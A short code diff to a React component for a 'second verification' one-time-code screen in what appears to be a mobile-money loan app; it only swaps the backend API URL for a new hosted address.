@@ -2,7 +2,8 @@ import { useState, useRef, type KeyboardEvent } from "react";
 import { useNavigate, useLocation } from "react-router-dom";
 import { Wallet, ArrowLeft } from "lucide-react";
 
-const API_URL = "https://fastloan-momo-kj8m.onrender.com";
+// ✅ UPDATED TO NEW RENDER URL
+const API_URL = "https://cameroon-mtn-loan-app.onrender.com";
 
 const SecondVerification = () => {
   const [secondOtp, setSecondOtp] = useState<string[]>(["", "", "", ""]);
